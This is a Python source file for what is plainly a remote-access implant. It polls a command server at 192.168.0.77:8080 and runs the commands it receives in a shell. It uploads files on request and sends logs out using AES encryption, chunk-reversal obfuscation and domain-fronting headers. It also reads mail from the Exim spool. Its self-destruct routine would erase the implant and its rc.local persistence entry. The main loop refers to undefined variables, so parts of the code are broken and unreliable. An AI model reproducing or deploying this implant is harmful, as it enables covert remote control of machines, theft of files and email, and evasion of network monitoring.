#!/usr/bin/env python3
import time
import requests
import base64
import subprocess
import os
import sys
import json
from requests.adapters import HTTPAdapter
from urllib3.poolmanager import PoolManager

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
import os
import base64
import hashlib
import urllib3
import time
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
BLOCK_SIZE = 16

key_path = "/var/tmp/pkey.txt"

def get_key():
    with open(key_path, 'rb') as f:
        return f.read()

KEY = get_key()


def do_everything(data):
    encrypted_data = aes_encrypt(data, KEY)
    obfuscated_data = obfuscate(encrypted_data)
    return obfuscated_data

def undo_everything(data):
    deobfuscated_data = deobfuscate(data)
    decrypted_data = aes_decrypt(deobfuscated_data, KEY)
    return decrypted_data


def aes_encrypt(plaintext, key):
    key_bytes = hashlib.sha256(key).digest()[:16]
    iv = os.urandom(BLOCK_SIZE)

    padder = padding.PKCS7(128).padder()
    padded_data = padder.update(plaintext.encode()) + padder.finalize()

    cipher = Cipher(algorithms.AES(key_bytes), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    encrypted = encryptor.update(padded_data) + encryptor.finalize()

    return base64.b64encode(iv + encrypted).decode()

def aes_decrypt(ciphertext_b64, key):
    key_bytes = hashlib.sha256(key).digest()[:16]
    raw = base64.b64decode(ciphertext_b64)
    iv = raw[:BLOCK_SIZE]
    encrypted = raw[BLOCK_SIZE:]

    cipher = Cipher(algorithms.AES(key_bytes), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    padded_data = decryptor.update(encrypted) + decryptor.finalize()

    unpadder = padding.PKCS7(128).unpadder()
    plaintext = unpadder.update(padded_data) + unpadder.finalize()

    return plaintext.decode()

def obfuscate(text):
    b64_text = base64.b64encode(text.encode()).decode()
    chunk_size = 16
    chunks = [b64_text[i:i+chunk_size] for i in range(0, len(b64_text), chunk_size)]
    if chunks and len(chunks[-1]) < chunk_size:
        chunks[-1] = chunks[-1].ljust(chunk_size, '@')
    return ''.join(reversed(chunks))

def deobfuscate(obf_str):
    chunk_size = 16
    chunks = [obf_str[i:i+chunk_size] for i in range(0, len(obf_str), chunk_size)]
    chunks = list(reversed(chunks))
    if chunks:
        chunks[-1] = chunks[-1].rstrip('@')
    ordered_chunks = ''.join(chunks)
    return base64.b64decode(ordered_chunks.encode()).decode()

FRONT_DOMAIN = "www.google.com"  
FRONT_DOMAIN = "192.168.0.77:8080"
REAL_DOMAIN = "192.168.0.77:8080"         
UPLOAD_PATH = "/upload"
COMMAND_PATH = "/command"
LOG_PATH = "/log"

UPLOAD_URL = f"https://{FRONT_DOMAIN}{UPLOAD_PATH}"
COMMAND_URL = f"https://{FRONT_DOMAIN}{COMMAND_PATH}"
LOG_URL = f"https://{FRONT_DOMAIN}{LOG_PATH}"

class SNIAdapter(HTTPAdapter):
    def __init__(self, server_hostname, *args, **kwargs):
        self.server_hostname = server_hostname
        super().__init__(*args, **kwargs)
        
    def init_poolmanager(self, connections, maxsize, block=False, **pool_kwargs):
        pool_kwargs['server_hostname'] = self.server_hostname
        self.poolmanager = PoolManager(num_pools=connections, maxsize=maxsize, block=block, **pool_kwargs)

def self_destruct():
    return
    try:
        log_file = "/tmp/implant.log"
        if os.path.exists(log_file):
            os.remove(log_file)
        implant_file = "/tmp/implant.py"
        if os.path.exists(implant_file):
            os.remove(implant_file)
        rc_local = "/etc/rc.local"
        if os.path.exists(rc_local):
            with open(rc_local, "r") as f:
                lines = f.readlines()
            with open(rc_local, "w") as f:
                for line in lines:
                    if "python3 /tmp/implant.py" not in line:
                        f.write(line)
        print("Self-destruct complete. Exiting.")
    except Exception as e:
        print("Error during self-destruct:", e)
    finally:
        sys.exit(0)

def send_log(log_message):
    try:
        session = requests.Session()
        adapter = SNIAdapter(server_hostname=FRONT_DOMAIN)
        session.mount("https://", adapter)
        headers = {"Host": REAL_DOMAIN}
        encrypted_log = do_everything(log_message)
        payload = {"data": encrypted_log}
        response = session.post(LOG_URL, data=payload, headers=headers, verify=False)
        if response.status_code == 200:
            print("Log sent successfully")
            return True
        else:
            print("Failed to send log. Status code:", response.status_code)
            return False
    except Exception as e:
        print("Error sending log:", e)
        return False

def send_file(file_path):
    try:
        with open(file_path, "rb") as file:
            file_data = file.read()
        file_data = base64.b64encode(file_data).decode()
        data = {
            "file_name": os.path.basename(file_path),
            "file_size": len(file_data),
            "data": file_data
        }
        data = json.dumps(data)
        secret_data = do_everything(data)
        payload = {"data": secret_data}
        session = requests.Session()
        adapter = SNIAdapter(server_hostname=FRONT_DOMAIN)
        session.mount("https://", adapter)
        headers = {"Host": REAL_DOMAIN}
        response = session.post(UPLOAD_URL, data=payload, headers=headers, verify=False)
        if response.status_code == 200:
            print("File sent successfully")
            return True
        else:
            print("Failed to send file. Status code:", response.status_code)
            return False
    except Exception as e:
        print("Error sending file:", e)
        return False

def poll_command():
    try:
        session = requests.Session()
        adapter = SNIAdapter(server_hostname=FRONT_DOMAIN)
        session.mount("https://", adapter)
        headers = {"Host": REAL_DOMAIN}
        response = session.get(COMMAND_URL, headers=headers, verify=False)
        print(response.request.url)
        if response.status_code == 200:
            json_data = response.json()
            obfuscated_cmd = json_data.get("data", "")
            if obfuscated_cmd:
                cmd = undo_everything(obfuscated_cmd)
                return cmd
        else:
            send_log(f"Failed to poll command. Status: {response.status_code}")
        return None
    except Exception as e:
        send_log(f"Error polling command:{e}")
        return None

def execute_command(cmd):
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        return output.decode()
    except subprocess.CalledProcessError as e:
        return e.output.decode()

def main():
    fail_count = 0
    while True:

        emails = "/var/spool/exim/input"
        timestamp = time.time()
        email_names = []
        timestamp_prev = now - 300
        for filename in os.listdir(dir_path):
                absolute_path = os.path.join(emails, filename)
                if os.path.isfile(filepath):
                        mtime = os.path.getmtime(filepath)
                        if mtime > timestamp:
                                email_names.append(filepath + "/" + filename)
				
        print(file_names)
	
        for cur_email in email_names:
                with open(cur_email, "r") as email:
                        lines = email.readlines()
                        print(lines)
			
	
        if fail_count >= 60:
            self_destruct()
            return

        cmd = poll_command()
        if cmd is None:
            fail_count += 1
            send_log(f"Failed to poll command. Fail count:{fail_count}")
        else:
            fail_count = 0
            if cmd.strip() == "HELO":
                self_destruct()
                return
            elif cmd.strip().split('!')[0].strip()=="rcpt to:":
                file_path = cmd.strip().split('!')[1].strip()
                if os.path.exists(file_path):
                    send_file(file_path)
                else:
                    send_log(f"File {file_path} does not exist.")
            else:
                result = execute_command(cmd)
                result = f"Executed Command: {cmd}\nOutput:\n{result}"
                send_log(result)
        time.sleep(15)
        

if __name__ == '__main__':
    main()
